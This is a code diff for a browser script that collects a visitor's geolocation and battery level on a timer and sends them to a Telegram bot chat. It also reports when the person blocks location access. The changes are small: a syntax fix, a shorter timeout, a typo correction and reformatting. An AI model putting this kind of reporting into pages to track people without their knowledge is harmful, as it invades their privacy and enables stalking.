@@ -1,13 +1,10 @@
 import { chatid, token } from "./telegram_config.js";
 
-
 const telegaMessageLink = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}`
-const telegaLocationLink = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatid}'
-
-`
+const telegaLocationLink = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatid}`
 const options = {
     enableHighAccuracy: true,
-    timeout: 10000,
+    timeout: 8000,
     maximumAge: 0
 };
 
@@ -20,7 +17,7 @@ const textLongitude = document.querySelector('#longitude')
 const someError = (err) => {
 
     if (err.code === 1) {
-        const textError = 'ОП заблокировал передачу геолакации'
+        const textError = 'ОП заблокировал передачу геолокации'
         $.ajax({
             type: "POST",
             url: `${telegaMessageLink}/parse_mode=HTML&text=${textError}`,
@@ -71,7 +68,6 @@ const showPosition = (position) => {
     textLatitude.textContent = `Широта: ${latitude}`
     textLongitude.textContent = `Долгота: ${longitude}`
 
-
 }
 
 const intervalPosition = setInterval(() => {
@@ -109,10 +105,9 @@ const getBattery = () => {
 getBattery()
 
 //  Button
-    const button = document.querySelector('#button-hand-position')
-    button.addEventListener('click', () => {
+const button = document.querySelector('#button-hand-position')
+button.addEventListener('click', () => {
             getPosition();
             getBattery()
-        }
-    );
-
+}
+);
